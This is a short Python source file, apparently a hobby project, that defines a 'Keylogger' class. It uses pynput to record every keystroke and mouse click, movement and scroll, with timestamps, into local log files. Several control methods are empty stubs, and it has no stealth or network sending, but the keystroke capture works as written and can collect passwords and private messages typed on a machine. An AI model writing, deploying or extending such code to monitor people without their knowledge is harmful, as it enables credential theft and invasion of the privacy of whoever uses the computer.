from pynput import mouse, keyboard
from dateTime import Datetime
import arrow

class Keylogger:
	def __init__(self, mouse_log_filename, keyboard_log_filename):
		self.mouse_log_filename = mouse_log_filename
		self.keyboard_log_filename = keyboard_log_filename
		self.date_time = Datetime()

	# mouse have 3 main events (click, move and scroll)
	# click
	def on_click(self, x, y, button, pressed):
		self.write_mouse_log(self.mouse_log_filename, self.date_time.get_date_time() + "{0} at {1}\n".format("Mouse button Pressed " if pressed else "Mouse button Released", (x, y)))
		if not pressed:
			self.stop_mouse_listener()
	#Move
	def on_move(self, x, y):
		self.write_mouse_log(self.mouse_log_filename, self.date_time.get_date_time() + "Mouse Pointer moved to {0}\n".format((x,y)))

	#Scroll
	def on_scroll(self, x, y, dx, dy):
		self.write_mouse_log(self.mouse_log_filename, self.date_time.get_date_time() + "Mouse Scrolled {0} at {1}\n".format("Down" if dy < 0 else "Up", (x, y)))
		
	def start_mouse_listener(self):
		with mouse.Listener(
			on_click = self.on_click,
			on_move = self.on_move,
			on_scroll = self.on_scroll
			) as listener:
			listener.join()

	# Keyboard have two main event (press, release)
	# press
	def on_press(self, key):
		try:
			self.write_keyboard_log(self.keyboard_log_filename, self.date_time.get_date_time() + "{0} pressed\n".format(key))
		except AttributeError:
			self.write_keyboard_log(self.keyboard_log_filename, self.date_time.get_date_time() + "Special key {0} pressed\n".format(key))
	# Release
	def on_release(self, key):
		self.write_keyboard_log(self.keyboard_log_filename, self.date_time.get_date_time() + "{0} released\n".format(key))
		if key == keyboard.Key.esc:
			# Stop listener
			return False

	def start_keyboard_listener(self):
		# Collect events until released
		with keyboard.Listener(
			on_press = self.on_press,
			on_release = self.on_release
			) as listener:
			listener.join()
	def start_listener(self):
		pass
	def stop_mouse_listener(self):
		return False
	def stop_keyboard_listener(self):
		pass
	def stop_listener(self):
		pass
	def toggle_mouse_listener(self):
		pass
	def toggle_keyboard_listener(self):
		pass
	def toggle_listener(self):
		pass

	def write_mouse_log(self, mouse_log_filename, input):
		with open(mouse_log_filename, "a+") as mouse_log:
			mouse_log.write(input)
		return True

	def write_keyboard_log(self, keyboard_log_filename, input):
		with open(keyboard_log_filename, "a+") as keyboard_log:
			keyboard_log.write(input)
		return True